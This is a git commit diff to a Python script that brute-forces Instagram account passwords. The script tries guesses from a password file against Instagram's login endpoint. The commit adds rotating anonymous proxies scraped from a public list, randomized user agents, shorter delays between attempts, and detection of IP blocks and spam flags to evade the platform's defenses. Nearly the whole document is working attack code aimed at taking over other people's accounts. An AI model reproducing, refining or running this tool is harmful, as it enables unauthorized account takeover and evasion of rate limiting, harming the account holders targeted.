82e964e5702b5cf5c07db46a702ac70a159cbad6
moomle00000 <68758566+moomle00000@users.noreply.github.com>
2021-07-08 01:30:06 +0300

    Update instagram brute req by LM.py

--- instagram brute req by LM.py
+++ instagram brute req by LM.py
@@ -1,8 +1,13 @@
-
+from lxml.html import fromstring
 import requests
+from requests.auth import HTTPProxyAuth
 import random
 import time
-
+from bs4 import BeautifulSoup as bs
+import urllib3
+from urllib.request import Request, urlopen
+from bs4 import BeautifulSoup
+from fake_useragent import UserAgent
 
 print("""
 
@@ -23,12 +28,38 @@ print("""
 
 
 def login():
+    count = 0
     username = input("[+] Username : ")
+    
+    
     while True:
-        passw = open('passw.txt', 'r').read().splitlines()
-        password = random.choice(passw)
+        ua = UserAgent()
+        proxies = [] # Will contain proxies [ip, port]
+        proxies_req = Request('https://free-proxy-list.net/anonymous-proxy.html')
+        proxies_req.add_header('User-Agent', ua.random)
+        proxies_doc = urlopen(proxies_req).read().decode('utf8')
+        soup = BeautifulSoup(proxies_doc, 'html.parser')
+        proxies_table = soup.find(id='proxylisttable')
+        # find_all proxies in the array
+        for row in proxies_table.tbody.find_all('tr'):
+            proxies.append({
+            'ip':   row.find_all('td')[0].string,
+            'port': row.find_all('td')[1].string
+            })
+
+        # Choose a random proxy
+        proxy_index = random.randint(0, len(proxies) - 1)
+        proxy = proxies[proxy_index]
+        PROXY = proxy['ip'] + ':' + proxy['port']
         
-        timeslleep = random.randint(10, 30)
+        proxieso = {'http': 'http://'+PROXY, 'https': 'http://'+PROXY}
+        #proxy end 
+        lines1 = [line for line in open ("passw.txt")]
+
+        count += 1
+        password = lines1[count].strip()
+        
+        timeslleep = random.randint(2, 4)
         
         headers = {
             'authority': 'www.instagram.com',
@@ -61,22 +92,44 @@ def login():
             'username': username,
             'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:' + password
         }
-
-        time.sleep(timeslleep)
-        request = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=headers ,data=data).text
-        print("[+] request : " + request,"\n""[+] chack password : " + password)
         print()
+        print("[+] PROXY : "+PROXY)
 
-        if ('"authenticated":true')in request:
-            print("""
+        try:
+            
+            request = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=headers ,data=data,proxies=proxieso).text
+            
+            print("[+] Username : "+username)
+            print("[+] chack password : " + password)
+
+            if ('"authenticated":true')in request:
+                print("""
                 
 █▄█ █▀▀ █▀   █░█ █▀▀   █ █▀   █▀▀ █ █▄░█ █▀▄   ▀█▀ █░█ █▀▀   █▀█ ▄▀█ █▀ █▀ █░█░█ █▀█ █▀█ █▀▄
 ░█░ ██▄ ▄█   █▀█ ██▄   █ ▄█   █▀░ █ █░▀█ █▄▀   ░█░ █▀█ ██▄   █▀▀ █▀█ ▄█ ▄█ ▀▄▀▄▀ █▄█ █▀▄ █▄▀
                 """)
-            print("[+] password : " + password)
-            break
-        
-        if ('"status":"fail"') in request:
-            print("[+] time out : " + password)
+                print("[+] password : " + password)
+                break
+            
+            if ('"message":"Please wait a few minutes before you try again."') in request:
+                print("maby is find the password")
 
+            if ('"authenticated":false') in request:
+                print("[+] Bad password : "+password) 
+
+            if ('"error_type":"ip_block"') in request:
+                print("[+] IP Block : "+PROXY)
+
+            if('"spam":true') in request:
+                print("[+] spam ip: "+PROXY) 
+
+            if ('"status":"fail"') in request:
+                print("[+] time out : " + PROXY)
+                print("[+] maby you have ban : ")
+                
+            if ('"message":"Please wait a few minutes before you try again."') in request:
+                print("[+] Please wait a few minutes before you try again.")
+            print()    
+        except:
+            print("[+] Error 400 : ")
 login()    
